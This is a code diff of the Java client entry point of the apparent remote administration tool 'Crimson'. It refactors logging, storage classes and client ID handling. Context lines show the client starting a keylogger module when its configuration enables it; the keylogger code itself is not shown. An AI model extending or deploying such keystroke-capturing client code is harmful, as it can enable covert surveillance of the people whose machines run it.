@@ -28,11 +28,12 @@ import org.slf4j.LoggerFactory;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.net.ClientConnectionStore;
 import com.subterranean_security.crimson.client.store.ConfigStore;
-import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
 import com.subterranean_security.crimson.core.misc.EH;
+import com.subterranean_security.crimson.core.platform.Environment;
 import com.subterranean_security.crimson.core.storage.BasicDatabase;
-import com.subterranean_security.crimson.core.storage.StorageFacility;
+import com.subterranean_security.crimson.core.storage.BasicStorageFacility;
+import com.subterranean_security.crimson.core.store.LcvidStore;
 import com.subterranean_security.crimson.core.util.LogUtil;
 import com.subterranean_security.crimson.core.util.Native;
 import com.subterranean_security.crimson.universal.Universal.Instance;
@@ -40,13 +41,18 @@ import com.subterranean_security.crimson.universal.stores.DatabaseStore;
 import com.subterranean_security.crimson.universal.stores.PrefStore;
 
 public class Client {
-	private static final Logger log = LoggerFactory.getLogger(Client.class);
+
+	/**
+	 * Nested class to prevent Logger from getting default configuration
+	 */
+	private static final class Log {
+		public static final Logger log = LoggerFactory.getLogger(Client.class);
+	}
 
 	public static void main(String[] args) {
-
 		LogUtil.configure();
 
-		log.info("Initializing client");
+		Log.log.info("Initializing client");
 
 		// Establish the custom fallback exception handler
 		Thread.setDefaultUncaughtExceptionHandler(new EH());
@@ -73,14 +79,11 @@ public class Client {
 		ConfigStore.loadConfig();
 
 		try {
-			Common.cvid = DatabaseStore.getDatabase().getInteger("cvid");
+			LcvidStore.cvid = DatabaseStore.getDatabase().getInteger("cvid");
 		} catch (Exception e2) {
 		}
 
-		log.debug("CVID: {}", Common.cvid);
-
-		// Initialize connection stores
-		ClientConnectionStore.initialize();
+		Log.log.debug("CVID: {}", LcvidStore.cvid);
 
 		if (ConfigStore.getConfig().getKeylogger()) {
 			try {
@@ -89,7 +92,7 @@ public class Client {
 			} catch (HeadlessException e) {
 				// ignore
 			} catch (Exception e) {
-				log.error("Failed to start keylogger: {}", e.getMessage());
+				Log.log.error("Failed to start keylogger: {}", e.getMessage());
 				e.printStackTrace();
 			}
 		}
@@ -100,18 +103,17 @@ public class Client {
 	}
 
 	private static void initializeDatabase() {
-		StorageFacility sf = new BasicDatabase(Client.class.getName(),
-				new File(Common.Directories.base + "/var/client.db"));
+		BasicStorageFacility sf = new BasicDatabase(new File(Environment.base + "/var/client.db"));
 		try {
 			sf.initialize();
 		} catch (ClassNotFoundException e) {
-			log.error("Failed to load SQLite dependancy");
+			Log.log.error("Failed to load SQLite dependancy");
 			System.exit(0);
 		} catch (IOException e) {
-			log.error("Failed to write database");
+			Log.log.error("Failed to write database");
 			System.exit(0);
 		} catch (SQLException e) {
-			log.error("SQL error: {}", e.getMessage());
+			Log.log.error("SQL error: {}", e.getMessage());
 			System.exit(0);
 		}
 
